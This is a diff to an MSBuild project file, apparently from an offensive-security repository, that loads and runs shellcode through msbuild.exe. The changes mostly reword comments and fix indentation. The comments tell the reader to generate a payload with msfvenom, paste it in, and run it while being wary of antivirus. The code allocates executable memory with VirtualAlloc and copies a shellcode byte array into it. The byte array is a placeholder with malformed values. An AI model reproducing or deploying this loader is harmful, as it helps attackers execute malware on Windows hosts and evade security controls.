@@ -5,8 +5,9 @@
 	
   <!-- This executes shellcode via msbuild.exe (be careful of A.V products) -->
   <!-- To execute your own shellcode, you first need to generate one using MSFVENOM: -->
-  <!-- msfvenom -p <payload to use>  -e <encoder (optional)>  -f ps1 (could also be done with csharp or powershell) -->
-  <!-- Save in a file and execute it: C:\Windows\Microsoft.NET\Framework\v4.0.30319\msbuild.exe Shellcode.csproj -->
+  <!--     msfvenom -p <payload to use>  -e <encoder (optional)>  -f ps1 (could also be done with csharp or powershell) -->
+  <!-- Adapt the XML below with your shellcode and adapt payload's length in buffer allocation-->
+  <!-- Execution: C:\Windows\Microsoft.NET\Framework\v4.0.30319\msbuild.exe Shellcode.csproj -->
 	
   <!-- Payload generation tool: https://github.com/Mr-Un1k0d3r/PowerLessShell -->
 	
@@ -47,8 +48,7 @@
             );          
           public override bool Execute()
           {
-            byte[] shellcode = new byte[351] {0xb0,0xob,0x4d,0xad,0x...};
-
+              byte[] shellcode = new byte[351] {0xb0,0xob,0x4d,0xad,0x...};
 	      UInt32 funcAddr = VirtualAlloc(0, (UInt32)shellcode.Length,
               MEM_COMMIT, PAGE_EXECUTE_READWRITE);
               Marshal.Copy(shellcode, 0, (IntPtr)(funcAddr), shellcode.Length);
